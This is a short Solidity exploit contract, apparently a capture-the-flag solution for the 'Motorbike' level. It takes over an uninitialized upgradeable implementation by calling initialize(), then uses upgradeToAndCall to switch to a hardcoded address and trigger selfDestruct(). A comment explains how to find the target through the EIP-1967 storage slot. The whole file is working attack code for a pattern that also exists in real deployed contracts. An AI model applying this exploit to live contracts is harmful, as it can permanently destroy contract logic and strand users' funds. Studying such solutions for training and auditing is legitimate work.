// SPDX-License-Identifier: MIT
pragma solidity <0.7.0;
// pragma experimental ABIEncoderV2;

import "./Motorbike.sol";

contract EngineAttack {
    // get engine address using web3.eth.getStorageAt(<proxy_address>,"0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc");
    Engine engine = Engine(0xEb367D9B67fE2A82D74EC91dCD35C651268F53EB);

    function attack() external {
        // making ourselves upgrader
        engine.initialize();
        // change implementation to malicious address and call selfdestruct function
        bytes memory encodedData = abi.encodeWithSignature("selfDestruct()");
        engine.upgradeToAndCall(
            0x65719d31923B876697D0d4ca51E1FDc2c5b1EC0E,
            encodedData
        );
    }
}
